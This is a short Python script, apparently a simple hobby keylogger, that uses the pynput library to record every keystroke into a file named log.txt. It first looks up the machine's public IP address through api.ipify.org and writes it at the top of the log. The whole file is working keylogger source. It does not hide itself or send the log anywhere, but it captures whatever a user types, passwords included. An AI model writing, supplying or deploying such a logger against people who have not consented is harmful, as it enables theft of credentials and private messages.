import pynput
import sys
import requests

from pynput.keyboard import Key, Listener

# This function writes the keys to the log file
def write_to_file(key):
    with open('log.txt', 'a') as f:
        # Convert key to a string and remove quotes
        k = str(key).replace("'", "")
        
        # Handle special keys
        if k == 'Key.space':
            f.write(' ')  # Write a space for spacebar
        elif k == 'Key.enter':
            f.write('\n')  # Newline for enter key
        elif 'Key' in k:
            f.write(f'[{k}]')  # Write key name for other special keys
        else:
            f.write(k)  # Write the character as is

# Callback function for key press
def press(key):
    print("{} pressed".format(key))
    write_to_file(key)

# Callback function for key release
def release(key):
    if key == Key.esc:
        return False  # Stop listener when 'esc' is pressed

# Get the internet IP address
response = requests.get("https://api.ipify.org?format=json")
ip_address = response.json()["ip"]
print("Internet IP Address:", ip_address)

# Write the internet IP address to the log file
with open('log.txt', 'w') as f:
    f.write("Internet IP Address: {}\n".format(ip_address))

# Start the keyboard listener
with Listener(on_press=press, on_release=release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        sys.exit(0)
